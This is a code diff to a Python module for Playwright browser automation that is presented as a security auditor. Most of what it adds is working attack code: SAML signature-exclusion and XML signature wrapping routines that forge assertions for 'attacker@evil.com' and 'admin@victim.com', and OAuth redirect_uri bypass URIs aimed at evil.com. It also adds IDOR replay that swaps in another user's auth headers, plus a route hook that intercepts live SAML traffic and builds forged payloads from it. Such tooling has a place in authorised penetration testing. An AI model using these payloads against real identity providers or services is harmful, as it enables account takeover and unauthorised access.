@@ -1,23 +1,222 @@
 """
-Unified Security Auditor v5 (Async Production Ready)
+Unified Security Auditor v5 (Enterprise Async Production Ready)
 Module: unified_security_auditor_v5.py
 
 A modular, production-grade security auditing toolkit designed for Playwright
-and Behavioral-Playwright async workflows.
+and Behavioral-Playwright async workflows. Includes SAML 2.0 Trust-Chain Auditor,
+OAuth 2.0 / OIDC Logic Auditor, DOM Sink Auditor, IDOR / BOLA Replay with PII
+Leakage Heuristics, MCP Safety Auditor, State Delta Engine, and Shell-Safe PoC Generator.
 """
 
-import json
+import asyncio
+import base64
 import hashlib
-import time
+import json
+import logging
 import re
 import shlex
-import asyncio
+import time
 import urllib.parse
-import logging
-from typing import Dict, Any, List, Optional
+import xml.etree.ElementTree as ET
+import zlib
+from collections import deque
+from typing import Dict, Any, List, Optional, Tuple
 
 logger = logging.getLogger("BehavioralEvasion.SecurityAuditor")
 
+# Register common SAML namespaces cleanly to prevent duplicate xmlns collisions
+ET.register_namespace('saml2p', 'urn:oasis:names:tc:SAML:2.0:protocol')
+ET.register_namespace('saml2', 'urn:oasis:names:tc:SAML:2.0:assertion')
+ET.register_namespace('ds', 'http://www.w3.org/2000/09/xmldsig#')
+
+
+# =====================================================================
+# SECTION 1: SAML 2.0 TRUST-CHAIN AUDITOR
+# =====================================================================
+class SAMLTrustChainAuditor:
+    """
+    Audits SAML 2.0 Service Provider (SP) and Identity Provider (IdP)
+    trust chains for Signature Exclusion, XML Signature Wrapping (XSW),
+    RelayState Open Redirect Chaining, and Assertion Replay.
+    """
+
+    def __init__(self, target_url: str = ""):
+        self.target_url = target_url
+        self.captured_saml_responses: List[Dict[str, Any]] = []
+
+    @staticmethod
+    def decode_saml_payload(saml_str: str) -> str:
+        """
+        Decodes SAML payload supporting both:
+        1. HTTP POST Binding: Raw Base64 XML
+        2. HTTP Redirect Binding: Deflate-compressed + Base64
+        Handles URL unquoting, plus conversion, and missing Base64 padding.
+        """
+        try:
+            unquoted = urllib.parse.unquote(saml_str).strip().replace(" ", "+")
+            padded = unquoted + "=" * ((4 - len(unquoted) % 4) % 4)
+            raw_bytes = base64.b64decode(padded)
+
+            for wbits in [-15, 15, 32 + 15]:
+                try:
+                    decompressed = zlib.decompress(raw_bytes, wbits)
+                    return decompressed.decode("utf-8", errors="replace")
+                except Exception:
+                    pass
+
+            return raw_bytes.decode("utf-8", errors="replace")
+        except Exception as e:
+            return f"<!-- Decoding Error: {str(e)} -->"
+
+    @staticmethod
+    def encode_saml_payload(xml_str: str, compress: bool = False) -> str:
+        """Encodes modified XML back into Base64 string (optional DEFLATE)."""
+        raw_bytes = xml_str.encode("utf-8")
+        if compress:
+            comp_obj = zlib.compressobj(level=9, method=zlib.DEFLATED, wbits=-15)
+            raw_bytes = comp_obj.compress(raw_bytes) + comp_obj.flush()
+        encoded_bytes = base64.b64encode(raw_bytes)
+        return encoded_bytes.decode("utf-8")
+
+    @staticmethod
+    def _is_safe_xml(xml_str: str) -> bool:
+        """Defends against XML Entity Expansion (Billion Laughs) and XXE."""
+        upper = xml_str.upper()
+        if "<!DOCTYPE" in upper or "<!ENTITY" in upper:
+            return False
+        return True
+
+    def test_signature_exclusion(self, xml_str: str, spoofed_nameid: str = "attacker@evil.com") -> Tuple[str, bool]:
+        """
+        Strips <ds:Signature> or <Signature> tags and alters NameID using
+        namespace-aware XML ElementTree processing with fallback regex.
+        """
+        if self._is_safe_xml(xml_str):
+            try:
+                root = ET.fromstring(xml_str)
+                was_modified = False
+
+                def process_element(parent):
+                    nonlocal was_modified
+                    to_remove = []
+                    for child in list(parent):
+                        tag_local = child.tag.split("}")[-1] if "}" in child.tag else child.tag
+                        if tag_local == "Signature":
+                            to_remove.append(child)
+                            was_modified = True
+                        elif tag_local == "NameID":
+                            if child.text != spoofed_nameid:
+                                child.text = spoofed_nameid
+                                was_modified = True
+                        else:
+                            process_element(child)
+
+                    for child in to_remove:
+                        parent.remove(child)
+
+                process_element(root)
+                modified_xml = ET.tostring(root, encoding="utf-8").decode("utf-8")
+                return self.encode_saml_payload(modified_xml), was_modified
+            except Exception:
+                pass
+
+        # Fallback to regex if XML parsing fails or contains entity declarations
+        xml_nosig = re.sub(r'<(?:[a-zA-Z0-9_]+:)?Signature[^>]*>.*?</(?:[a-zA-Z0-9_]+:)?Signature>', '', xml_str, flags=re.DOTALL)
+        xml_modified = re.sub(
+            r'(<(?:[a-zA-Z0-9_]+:)?NameID[^>]*>)(.*?)(</(?:[a-zA-Z0-9_]+:)?NameID>)',
+            lambda m: m.group(1) + spoofed_nameid + m.group(3),
+            xml_nosig,
+            flags=re.DOTALL
+        )
+        return self.encode_saml_payload(xml_modified), (xml_modified != xml_str)
+
+    def test_xml_signature_wrapping_xsw3(self, xml_str: str, spoofed_nameid: str = "admin@victim.com") -> Tuple[str, bool]:
+        """Generates XSW3 variant payload: inserts forged unsigned Assertion before signed Assertion."""
+        try:
+            match = re.search(r'(<(?:[a-zA-Z0-9_]+:)?Assertion[^>]*>.*?</(?:[a-zA-Z0-9_]+:)?Assertion>)', xml_str, flags=re.DOTALL)
+            if not match:
+                return self.encode_saml_payload(xml_str), False
+            orig_assertion = match.group(1)
+            unsigned_assertion = re.sub(r'<(?:[a-zA-Z0-9_]+:)?Signature[^>]*>.*?</(?:[a-zA-Z0-9_]+:)?Signature>', '', orig_assertion, flags=re.DOTALL)
+            unsigned_assertion = re.sub(
+                r'(<(?:[a-zA-Z0-9_]+:)?NameID[^>]*>)(.*?)(</(?:[a-zA-Z0-9_]+:)?NameID>)',
+                lambda m: m.group(1) + spoofed_nameid + m.group(3),
+                unsigned_assertion,
+                flags=re.DOTALL
+            )
+            unsigned_assertion = re.sub(r'ID=(["\'])([^"\']+)\1', r'ID=\1\2_forged\1', unsigned_assertion, count=1)
+            xsw_xml = xml_str.replace(orig_assertion, unsigned_assertion + "\n" + orig_assertion, 1)
+            return self.encode_saml_payload(xsw_xml), True
+        except Exception:
+            return self.encode_saml_payload(xml_str), False
+
+    def test_relaystate_open_redirect(self, relay_state_val: Optional[str]) -> Dict[str, Any]:
+        """Audits RelayState parameter for open redirect / protocol smuggling safely handling NoneType values."""
+        val = str(relay_state_val or "")
+        dangerous_patterns = ["//", "http://", "https://", "javascript:", ".evil.com"]
+        is_suspicious = any(pattern in val for pattern in dangerous_patterns)
+        return {
+            "relay_state": val,
+            "open_redirect_risk": "HIGH" if is_suspicious else "LOW",
+            "cwe_id": "CWE-601 (URL Redirection to Untrusted Site)",
+            "details": f"RelayState '{val}' contains external redirect structure." if is_suspicious else "RelayState appears benign."
+        }
+
+
+# =====================================================================
+# SECTION 2: OAUTH 2.0 & OIDC LOGIC AUDITOR
+# =====================================================================
+class OAuth2TrustChainAuditor:
+    """Audits OAuth 2.0 and OpenID Connect (OIDC) implementation logic according to RFC 9700 and RFC 7636."""
+
+    def __init__(self):
+        self.intercepted_flows: List[Dict[str, Any]] = []
+
+    def audit_redirect_uri_patterns(self, base_redirect_uri: str) -> List[Dict[str, Any]]:
+        """Generates 7 RFC 9700 bypass variations for redirect_uri validation."""
+        parsed = urllib.parse.urlparse(base_redirect_uri)
+        domain = parsed.netloc
+        scheme = parsed.scheme or "https"
+        path = parsed.path or "/callback"
+
+        return [
+            {"type": "Subdomain Bypass", "uri": f"{scheme}://evil.{domain}{path}"},
+            {"type": "Path Traversal", "uri": f"{scheme}://{domain}{path}/../attacker_callback"},
+            {"type": "Parameter Injection", "uri": f"{scheme}://{domain}{path}?redirect=https://evil.com"},
+            {"type": "Fragment Injection", "uri": f"{scheme}://{domain}{path}#@evil.com"},
+            {"type": "Open Redirect Chain", "uri": f"{scheme}://{domain}/go?url=https://evil.com"},
+            {"type": "Localhost Bypass", "uri": "http://localhost:8080/callback"},
+            {"type": "Scheme Downgrade", "uri": f"http://{domain}{path}"}
+        ]
+
+    def audit_pkce_enforcement(self, token_request_body: Dict[str, Any]) -> Dict[str, Any]:
+        """
+        Audits OAuth 2.0 /token request body for mandatory PKCE 'code_verifier' parameter.
+        RFC 7636 specifies 'code_challenge' is strictly for /authorize, while 'code_verifier'
+        must be present during the /token exchange.
+        """
+        has_code_verifier = "code_verifier" in token_request_body
+        return {
+            "pkce_enforced": has_code_verifier,
+            "risk": "NONE" if has_code_verifier else "CRITICAL (Authorization Code Interception Risk)",
+            "recommendation": "Require mandatory 'code_verifier' parameter in /token exchange body for PKCE enforcement (RFC 7636)."
+        }
+
+    def audit_account_linking_claims(self, jwt_claims: Dict[str, Any]) -> Dict[str, Any]:
+        """Checks if identity matching relies on mutable email claim vs immutable 'sub' claim."""
+        has_sub = "sub" in jwt_claims
+        uses_email_only = "email" in jwt_claims and not has_sub
+        return {
+            "uses_immutable_sub": has_sub,
+            "vulnerable_to_email_account_takeover": uses_email_only,
+            "risk": "HIGH" if uses_email_only else "LOW",
+            "cwe_id": "CWE-287 (Improper Authentication)"
+        }
+
+
+# =====================================================================
+# SECTION 3: IN-BROWSER DOM SINK AUDITOR
+# =====================================================================
 DOM_SINK_HOOK_SCRIPT = """
 (function() {
     if (window.__domSinkAuditorInjected) return;
@@ -104,8 +303,13 @@ DOM_SINK_HOOK_SCRIPT = """
 """
 
 async def attach_dom_sink_auditor(page):
-    if hasattr(page, "add_init_script"):
-        await page.add_init_script(DOM_SINK_HOOK_SCRIPT)
+    try:
+        if hasattr(page, "add_init_script"):
+            await page.add_init_script(DOM_SINK_HOOK_SCRIPT)
+        if hasattr(page, "evaluate"):
+            await page.evaluate(DOM_SINK_HOOK_SCRIPT)
+    except Exception:
+        pass
 
 async def get_dom_sink_events(page) -> List[Dict[str, Any]]:
     try:
@@ -116,11 +320,15 @@ async def get_dom_sink_events(page) -> List[Dict[str, Any]]:
     except Exception:
         return []
 
+
+# =====================================================================
+# SECTION 4: DUAL-CONTEXT ACCESS CONTROL AUDITOR (IDOR / BOLA)
+# =====================================================================
 class DualContextAuditor:
-    def __init__(self, context_a=None, context_b=None):
+    def __init__(self, context_a=None, context_b=None, max_captured_requests: int = 500):
         self.context_a = context_a
         self.context_b = context_b
-        self.captured_requests: List[Dict[str, Any]] = []
+        self.captured_requests: deque = deque(maxlen=max_captured_requests)
         self.user_b_auth_headers: Dict[str, str] = {}
 
     def attach_request_interceptor(self, page):
@@ -144,7 +352,7 @@ class DualContextAuditor:
     async def audit_captured_requests(self) -> List[Dict[str, Any]]:
         findings = []
         if not self.context_b or not hasattr(self.context_b, "request"):
-            for req in self.captured_requests:
+            for req in list(self.captured_requests):
                 findings.append({
                     "url": req["url"],
                     "method": req["method"],
@@ -153,8 +361,8 @@ class DualContextAuditor:
                 })
             return findings
 
-        for req in self.captured_requests:
-            swapped_headers = dict(req["headers"])
+        for req in list(self.captured_requests):
+            swapped_headers = {k: v for k, v in req["headers"].items() if k.lower() not in ["host", "content-length"]}
             swapped_headers.update(self.user_b_auth_headers)
             try:
                 response = await self.context_b.request.fetch(
@@ -204,6 +412,10 @@ class DualContextAuditor:
                 })
         return findings
 
+
+# =====================================================================
+# SECTION 5: MODEL CONTEXT PROTOCOL (MCP) SAFETY AUDITOR
+# =====================================================================
 class MCPSchemaAuditor:
     @staticmethod
     def audit_tool_schema(tool_definition: Dict[str, Any]) -> Dict[str, Any]:
@@ -231,16 +443,26 @@ class MCPSchemaAuditor:
                 return False
         return True
 
+
+# =====================================================================
+# SECTION 6: STATE-BASED DELTA TRACKER
+# =====================================================================
 class StateDiffAuditor:
     def __init__(self):
         self.baseline_state: Dict[str, str] = {}
 
     @staticmethod
     def _sanitize_dom(html_content: str) -> str:
+        """
+        Strips dynamic scripts, nonces, form input values, and Unix epoch timestamps
+        without removing legitimate product IDs or phone numbers.
+        """
         sanitized = re.sub(r'<script.*?>.*?</script>', '', html_content, flags=re.DOTALL | re.IGNORECASE)
         sanitized = re.sub(r'nonce="[^"]*"', '', sanitized)
+        sanitized = re.sub(r"nonce='[^']*'", '', sanitized)
         sanitized = re.sub(r'value="[^"]*"', '', sanitized)
-        sanitized = re.sub(r'\d{10,13}', '', sanitized)
+        sanitized = re.sub(r"value='[^']*'", '', sanitized)
+        sanitized = re.sub(r'\b(1[5-9]\d{8}|1[5-9]\d{11})\b', '', sanitized)
         return sanitized.strip()
 
     async def capture_state(self, page) -> Dict[str, Any]:
@@ -271,18 +493,26 @@ class StateDiffAuditor:
             "has_delta": dom_changed or scripts_changed
         }
 
+
+# =====================================================================
+# SECTION 7: SHELL-SAFE POC ENGINE
+# =====================================================================
 class PoCEngine:
     @staticmethod
     def generate_curl_poc(request_data: Dict[str, Any]) -> str:
+        """Synthesizes a shell-safe, reproducible cURL command properly serializing dict/list payloads to valid JSON."""
         url = request_data.get("url", "")
         method = request_data.get("method", "GET")
         headers = request_data.get("headers", {})
         data = request_data.get("post_data", None)
+
         curl_cmd = ["curl", "-i", "-X", method, url]
         for k, v in headers.items():
             if k.lower() not in ['host', 'content-length']:
                 curl_cmd.extend(["-H", f"{k}: {v}"])
         if data:
+            if isinstance(data, (dict, list)):
+                data = json.dumps(data)
             curl_cmd.extend(["--data-raw", str(data)])
         return " ".join(shlex.quote(arg) for arg in curl_cmd)
 
@@ -305,6 +535,10 @@ Reproducible Shell-Safe PoC Command:
 ======================================================================
 """
 
+
+# =====================================================================
+# SECTION 8: AGENT CONTEXT BOUNDARY AUDITOR
+# =====================================================================
 class AgentHijackAuditor:
     def __init__(self, max_token_budget: int = 32000):
         self.max_token_budget = max_token_budget
@@ -329,6 +563,10 @@ class AgentHijackAuditor:
         except Exception:
             return False
 
+
+# =====================================================================
+# SECTION 9: IN-BROWSER CLOSED-LOOP FUZZER
+# =====================================================================
 class ClosedLoopFuzzer:
     def __init__(self, page):
         self.page = page
@@ -368,6 +606,10 @@ class ClosedLoopFuzzer:
                 })
         return results
 
+
+# =====================================================================
+# SECTION 10: PROTOCOL DESYNC & CVE REPRODUCER
+# =====================================================================
 class DesyncEngine:
     @staticmethod
     def audit_header_desync_risk(headers: Dict[str, str]) -> Dict[str, Any]:
@@ -381,6 +623,7 @@ class DesyncEngine:
             "technical_note": "Browser HTTP stack normalizes headers. For active raw socket smuggling, use low-level TCP tools."
         }
 
+
 class CVEReproducer:
     @staticmethod
     def generate_docker_testbed_spec(cve_id: str, base_image: str) -> str:
@@ -393,11 +636,19 @@ LABEL cve_verification="{cve_id}"
 CMD ["/bin/bash"]
 """
 
+
+# =====================================================================
+# MASTER UNIFIED SECURITY AUDITOR CLASS (V5 Enterprise)
+# =====================================================================
 class UnifiedSecurityAuditorV5:
-    def __init__(self, page=None, context_a=None, context_b=None):
+    def __init__(self, page=None, context_a=None, context_b=None, target_url: str = ""):
         self.page = page
         self.context_a = context_a
         self.context_b = context_b
+        self.target_url = target_url
+
+        self.saml_auditor = SAMLTrustChainAuditor(target_url)
+        self.oauth_auditor = OAuth2TrustChainAuditor()
         self.idor_auditor = DualContextAuditor(context_a, context_b)
         self.mcp_auditor = MCPSchemaAuditor()
         self.state_auditor = StateDiffAuditor()
@@ -406,6 +657,75 @@ class UnifiedSecurityAuditorV5:
         self.fuzzer = ClosedLoopFuzzer(page) if page else None
         self.desync_engine = DesyncEngine()
         self.cve_reproducer = CVEReproducer()
+
+        self.audit_findings: List[Dict[str, Any]] = []
+
+    async def attach_to_behavioral_playwright(self, bp_session=None, page=None) -> bool:
+        active_page = page or getattr(bp_session, "page", None) or (bp_session if hasattr(bp_session, "route") else None) or self.page
+        if not active_page:
+            return False
+
+        await attach_dom_sink_auditor(active_page)
+
+        async def handle_route(route, request=None):
+            try:
+                req = request or (route.request if hasattr(route, "request") else route)
+                url = getattr(req, "url", "")
+                post_data = getattr(req, "post_data", "") or ""
+
+                parsed_url = urllib.parse.urlparse(url)
+                get_params = urllib.parse.parse_qs(parsed_url.query)
+                post_params = urllib.parse.parse_qs(post_data) if post_data else {}
+
+                saml_b64 = (
+                    post_params.get("SAMLResponse", [""])[0] or
+                    get_params.get("SAMLResponse", [""])[0] or
+                    post_params.get("SAMLRequest", [""])[0] or
+                    get_params.get("SAMLRequest", [""])[0]
+                )
+                relay_state = (
+                    post_params.get("RelayState", [""])[0] or
+                    get_params.get("RelayState", [""])[0]
+                )
+
+                if saml_b64 or "saml" in url.lower():
+                    if saml_b64:
+                        raw_xml = self.saml_auditor.decode_saml_payload(saml_b64)
+                        sig_excl, _ = self.saml_auditor.test_signature_exclusion(raw_xml)
+                        relay_audit = self.saml_auditor.test_relaystate_open_redirect(relay_state)
+                        is_post_binding = bool(post_params.get("SAMLResponse") or post_params.get("SAMLRequest"))
+                        self.audit_findings.append({
+                            "type": "SAML_TRUST_CHAIN_INTERCEPTED",
+                            "url": url,
+                            "binding": "HTTP-POST" if is_post_binding else "HTTP-REDIRECT",
+                            "raw_xml": raw_xml[:200],
+                            "signature_exclusion_b64": sig_excl[:80] + "...",
+                            "relay_state_audit": relay_audit
+                        })
+
+                redirect_uri = (
+                    get_params.get("redirect_uri", [""])[0] or
+                    post_params.get("redirect_uri", [""])[0]
+                )
+                if ("/oauth/" in url or "/authorize" in url or "/token" in url) and redirect_uri:
+                    bypasses = self.oauth_auditor.audit_redirect_uri_patterns(redirect_uri)
+                    self.audit_findings.append({
+                        "type": "OAUTH_TRUST_CHAIN_INTERCEPTED",
+                        "url": url,
+                        "redirect_uri": redirect_uri,
+                        "bypasses_generated": len(bypasses)
+                    })
+            finally:
+                try:
+                    await route.continue_()
+                except Exception:
+                    pass
+
+        try:
+            await active_page.route("**/*", handle_route)
+            return True
+        except Exception:
+            return False
 
     async def run_full_page_audit(self, page) -> Dict[str, Any]:
         await attach_dom_sink_auditor(page)
@@ -421,9 +741,11 @@ class UnifiedSecurityAuditorV5:
         captured_requests_count = len(self.idor_auditor.captured_requests)
         return {
             "timestamp": time.time(),
+            "target_url": self.target_url,
             "captured_state": state,
             "context_window_audit": ctx_audit,
             "captured_dom_sink_events": dom_events,
             "captured_api_requests": captured_requests_count,
-            "status": "All 9 Defensive Modules Initialized & Executed Cleanly"
+            "saml_oauth_findings_captured": len(self.audit_findings),
+            "status": "All 11 Defensive Modules Initialized & Executed Cleanly"
         }
